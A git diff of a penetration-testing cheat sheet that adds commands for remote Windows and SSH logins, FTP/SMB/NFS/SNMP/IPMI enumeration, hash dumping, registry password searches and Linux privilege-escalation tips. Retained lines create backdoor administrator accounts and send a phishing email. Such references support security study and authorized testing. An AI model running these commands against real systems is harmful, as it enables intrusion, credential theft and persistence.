@@ -356,12 +356,30 @@ Windows
     ~/.xsession
 </details>
 
-## RDP
+## RDP and other Windows remote management
 ```
 xfreerdp /u:uname /p:'pass' /v:IP
 xfreerdp /d:domain.com /u:uname /p:'pass' /v:IP
 xfreerdp /u:uname /p:'pass' /v:IP +clipboard #try this option if normal login doesn't work
+
+# Check the security settings of the RDP service.
+rdp-sec-check.pl <FQDN/IP>
+
+# Log in to the WinRM server.
+evil-winrm -i <FQDN/IP> -u <user> -p <password>
+
+# Execute command using the WMI service.
+wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"
 ```
+## SSH
+```
+# Remote security audit against the target SSH service.
+ssh-audit.py <FQDN/IP>
+
+# Enforce password-based authentication.
+ssh <user>@<FQDN/IP> -o PreferredAuthentications=password
+```
+
 ## Add SSH Public Key
 - Can be used to get a ssh session on target linux machine if SSH directory is accessible (check with ls -lA)
 ```
@@ -439,7 +457,7 @@ find / -name *.kdbx 2>/dev/null
 
 ### Windows
 
-```powershell
+```
 net user hacker hacker123 /add
 net localgroup Administrators hacker /add
 net localgroup "Remote Desktop Users" hacker /ADD
@@ -447,7 +465,7 @@ net localgroup "Remote Desktop Users" hacker /ADD
 
 ### Linux
 
-```powershell
+```
 adduser <uname> #Interactive
 useradd <uname>
 
@@ -462,7 +480,7 @@ Hash-id
 
 ### fcrackzip
 
-```powershell
+```
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip #Cracking zip files
 ```
 
@@ -482,7 +500,7 @@ john -w=/usr/share/wordlists/rockyou.txt hash.txt
 pdf2john file.pdf > file.hash, then crack with regular John
 ```
 
-### Hashcat
+## Hashcat
 
 > [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
 > 
@@ -493,6 +511,16 @@ echo 'hash text' > hash
 hashcat -m <number> hash wordlists.txt --force
 hashcat -m 0 -a o hash rockyou.txt # for md5 with regular attack
 # bcrypt 3200
+```
+
+## Port Forwarding with SSH
+```
+# Local port forwarding
+ssh <gateway> -L <local_port_to_listen_to>:<remote_host>:<remote_port>
+# Remote port forwarding
+ssh <gateway> -R <remote_port>:<local_host>:<local_port>
+# Dynamic port forwarding
+ssh -D <local proxy port> -p <remote port> <target><img width="514" height="108" alt="image" src="https://github.com/user-attachments/assets/f3e2da40-e3a3-4dcc-9d0f-c22e741431f7" />
 ```
 
 ## Pivoting through SSH
@@ -700,6 +728,14 @@ get <file>
 locate .nse | grep ftp
 nmap -p21 --script=<name> <IP>
 
+telnet <FQDN/IP> 21
+
+# Interact with the FTP service on the target using encrypted connection.
+openssl s_client -connect<FQDN/IP>:21 -starttls ftp
+
+# Download all available files on the target FTP server.
+wget -m --no-passive ftp://anonymous:anonymous@<target>
+
 # If it’s TFTP, can nmap find anything interesting?
 sudo nmap -n -Pn -sU -oN tftp.txt -p 69 -sV --script tftp-enum $IP
 
@@ -754,7 +790,8 @@ nmap --script smb-vuln* -p 139,445 -oN smb-vuln-scan <IP>
 net view \\<computername/IP> /all
 
 #nxc
-nxc smb <IP/range>  
+nxc smb <IP/range>
+nxc smb 192.168.1.100 -u '' -p '' --shares
 nxc smb 192.168.1.100 -u username -p password
 nxc smb 192.168.1.100 -u username -p password --shares #lists available shares
 nxc smb 192.168.1.100 -u username -p password --users #lists users
@@ -770,6 +807,7 @@ smbclient //server/share
 smbclient //server/share -U <username>
 smbclient //server/share -U domain/username
 smbclient \\\\$IP\\'Password Audit' -U resourced\\V.Ventz -c 'recurse;ls' # to show all files in the directories
+smbclient //ip/share, then to download every file available: recurse ON, prompt OFF, mget *
 
 #SMBmap
 smbmap -H <target_ip>
@@ -778,7 +816,8 @@ smbmap -H <target_ip> -u <username> -p <password> -d <domain>
 smbmap -H <target_ip> -u <username> -p <password> -r <share_name>
 smbmap -H <target_ip> --download "notes\note.txt"
 smbmap -H <target_ip> --upload test.txt "notes\test.txt"
-smbmap -R <name> -H <ip> -A <filename> -q #download a file to /usr/share/smbmap
+smbmap -R <sharename> -H <ip> # list all directories and files like tree
+smbmap -R <sharename> -H <ip> -A <filename> -q #download a file to /usr/share/smbmap
 smbmap -u <username> -p <password> -d <domain> -Hh <ip> -x 'net group "Domain Admins" /domain
 
 #to upload file
@@ -918,8 +957,23 @@ nslookup -type=TXT info.megacorptwo.com 192.168.50.151 #We are querying the info
 nc -nv <IP> 25 #Version Detection
 smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode; it can be RCPT, VRFY, EXPN
 
+telnet <FQDN/IP> 25
+
 #Sending email with valid credentials, the below is an example of Phishing mail attack
 sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
+```
+
+## IMAP Enumeration
+```
+# Log in to the IMAPS service using cURL.
+curl -k 'imaps://<FQDN/IP>' --user <user>:<password>
+
+# Connect to the IMAPS service.
+openssl s_client -connect <FQDN/IP>:imaps
+
+# Connect to the POP3s service.
+openssl s_client -connect <FQDN/IP>:pop3s
+
 ```
 
 ## LDAP Enumeration
@@ -962,6 +1016,13 @@ python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --privi
 ```
 nmap -sV --script=nfs-showmount <IP>
 showmount -e <IP>
+
+# Mount the specific NFS share.umount ./target-NFS
+mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock
+
+# Unmount the specific NFS share.
+umount ./target-NFS
+
 ```
 
 ## SNMP Enumeration
@@ -977,6 +1038,12 @@ snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25 #Windows User enumeration
 snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2 #Windows Processes enumeration
 snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2 #Installed software enumeraion
 snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3 #Opened TCP Ports
+
+# Querying OIDs using snmpwalk.
+snmpwalk -v2c -c <community string><FQDN/IP>
+
+# Bruteforcing community strings of the SNMP service.
+onesixtyone -c community-strings.list<FQDN/IP>
 
 #Windows MIB values
 1.3.6.1.2.1.25.1.6.0 - System Processes
@@ -1083,8 +1150,18 @@ sqlcmd> SELECT srvname, isremote FROM sysservers
 
 # Identify the user and its privileges used for the remote connection in MSSQL.
 sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
-```
 
+# Log in to the MSSQL server using Windows authentication.
+mssqlclient.py <user>@<FQDN/IP> -windows-auth
+```
+## IPMI Enumeration
+```
+# IPMI version detection.
+msf6 auxiliary(scanner/ipmi/ipmi_version)
+
+# Dump IPMI hashes.
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)
+```
 
 # Web Attacks
 
@@ -1278,6 +1355,11 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ## Manual Enumeration commands
 
 ```
+tasklist /SVC
+
+# check domain
+set userdomain
+
 #Groups we're part of
 whoami /groups
 
@@ -1432,7 +1514,8 @@ msiexec /quiet /qn /i reverse.msi
 ## Schedules Tasks
 
 ```
-schtasks /query /fo LIST /v #Displays list of scheduled tasks, Pickup any interesting one
+#Displays list of scheduled tasks, Pickup any interesting one
+schtasks /query /fo LIST /v 
 #Permission check - Writable means exploitable!
 icalcs "path"
 #Wait till the scheduled task in executed, then we'll get a shell
@@ -1523,11 +1606,14 @@ dir c:\ /s /b | findstr /si *vnc.ini
 
 ```
 reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
 reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
 
 #Putty keys
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
+
+reg query "HKLM\Software\Microsoft\Windows NT\Currentversion\Winlogon" /v LastUsedUsername
 
 ### VNC
 reg query "HKCU\Software\ORL\WinVNC3\Password"  
@@ -1566,13 +1652,19 @@ pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX2
 ---
 
 # Linux Privilege Escalation
-
+- [https://gtfobins.github.io/](https://gtfobins.github.io/) 
 - [Privesc through TAR wildcard](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)
 - If see a sh script (like for a cron job etc), look at what tools are used in the script and if any have RCE's on github
+- Put user in sudoers file
+- Copy root file and then give yourself permissions with 644
+- Copy root ssh file
+- Crack root pw in shadow file
+- Add root pw to /etc/passwd
+- Add user to sudo group: usermod -a -G GROUP USER
 
 ## TTY Shell
 
-```powershell
+```
 python -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 echo 'os.system('/bin/bash')'
@@ -1589,8 +1681,9 @@ screen
 
 ## Basic
 
-```bash
+```
 find / -writable -type d 2>/dev/null
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null # find writeable files or directories
 dpkg -l #Installed applications on Debian system
 cat /etc/fstab #Listing mounted drives
 lsblk #Listing all available drives
@@ -1598,6 +1691,7 @@ lsmod #Listing loaded drivers
 grep -rnw . -e 'word' # find word in files
 find / -iname 'word' 2>/dev/null # find locations where a word is mentioned
 grep -Ri 'password' /usr/share/openfire # look for passwords in previously found directories
+locate <file or binary>
 
 
 watch -n 1 "ps -aux | grep pass" #Checking processes for credentials
@@ -1607,7 +1701,7 @@ sudo tcpdump -i lo -A | grep "pass" #Password sniffing using tcpdump
 
 ## Automated Scripts
 
-```bash
+```
 linPEAS.sh
 LinEnum.sh
 linuxprivchecker.py
@@ -1617,11 +1711,13 @@ Mestaploit: multi/recon/local_exploit_suggester
 
 ## Sensitive Information
 
-```bash
+```
 cat .bashrc
 env #checking environment variables
+cat .bash_history # might show sensitive commands run 
 watch -n 1 "ps -aux | grep pass" #Harvesting active processes for credentials
 # Process-related information can also be obtained from PSPY
+
 ```
 
 ## Sudo/SUID/Capabilities
@@ -1629,7 +1725,7 @@ watch -n 1 "ps -aux | grep pass" #Harvesting active processes for credentials
 [GTFOBins](https://gtfobins.github.io/)
 
 
-```bash
+```
 sudo -l
 find / -perm -u=s -type f 2>/dev/null
 find / -perm /4000 -ls 2>/dev/null | grep php
@@ -1638,7 +1734,7 @@ getcap -r / 2>/dev/null
 
 ## Cron Jobs
 
-```bash
+```
 #Detecting Cronjobs
 cat /etc/crontab
 crontab -l
@@ -1650,7 +1746,7 @@ grep "CRON" /var/log/syslog #inspecting cron logs
 
 ## NFS
 
-```bash
+```
 ##Mountable shares
 cat /etc/exports #On target
 showmount -e <target IP> #On attacker
@@ -1669,7 +1765,7 @@ chmod +x <binary>
 > 
 
 <aside>
-💡 Run WinPEAS.exe - This may give us some more detailed information as no, we’re a privileged user, and we can open several files, which gives us some edge!
+Run WinPEAS.exe - This may give us some more detailed information as no, we’re a privileged user, and we can open several files, which gives us some edge!
 
 </aside>
 
@@ -1677,7 +1773,7 @@ chmod +x <binary>
 
 ### Powershell History
 
-```powershell
+```
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 
 #Example
@@ -1686,14 +1782,14 @@ type C:\Users\sathvik\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Co
 
 ### Searching for passwords
 
-```powershell
+```
 dir .s *pass* == *.config
 findstr /si password *.xml *.ini *.txt
 ```
 
 ### Searching in Registry for Passwords
 
-```powershell
+```
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
@@ -1705,7 +1801,7 @@ reg query HKCU /f password /t REG_SZ /s
 
 ### KDBX Files
 
-```powershell
+```
 #These are KeyPassX password-stored files
 cmd> dir /s /b *.kdbx 
 Ps> Get-ChildItem -Recurse -Filter *.kdbx
@@ -1737,7 +1833,7 @@ net localgroup Administrators #to check local admins
 
 ### Powerview
 
-```powershell
+```
 Import-Module .\PowerView.ps1 #loading module to powershell, if it gives an error then change the execution policy
 Get-NetDomain #basic information about the domain
 Get-NetUser #list of all users in the domain
@@ -1765,7 +1861,7 @@ Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
 
 - Collection methods - database
 
-```powershell
+```
 # Sharphound - transfer sharphound.ps1 into the compromised machine
 Import-Module .\Sharphound.ps1 
 Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefix "name" # collects and saved with the specified details, output will be saved in windows compromised machine
@@ -1776,7 +1872,7 @@ bloodhound-python -u 'uname' -p 'pass' -ns <rhost> -d <domain-name> -c all #outp
 
 - Running Bloodhound
 
-```powershell
+```
 sudo neo4j console
 # then upload the .json files obtained
 ```
@@ -1785,7 +1881,7 @@ sudo neo4j console
 
 - These files contain information in a well-structured webpage format.
 
-```bash
+```
 sudo ldapdomaindump ldaps://<IP> -u 'username' -p 'password' #Do this in a new folder
 ```
 
@@ -1794,7 +1890,7 @@ sudo ldapdomaindump ldaps://<IP> -u 'username' -p 'password' #Do this in a new f
 - Link: https://github.com/PlumHound/PlumHound install from the steps mentioned.
 - Keep both Bloodhound and Neo4j running as this tool acquires information from them.
 
-```bash
+```
 sudo python3 plumhound.py --easy -p <neo4j-password> #Testing connection
 python3 PlumHound.py -x tasks/default.tasks -p <neo4jpass> #Open index.html as once this command is completed it produces somany files
 firefox index.html
@@ -1808,7 +1904,7 @@ firefox index.html
 
 ### PsLoggedon
 
-```powershell
+```
 # To see user logons at remote system of a domain(external tool)
 .\PsLoggedon.exe \\<computername>
 ```
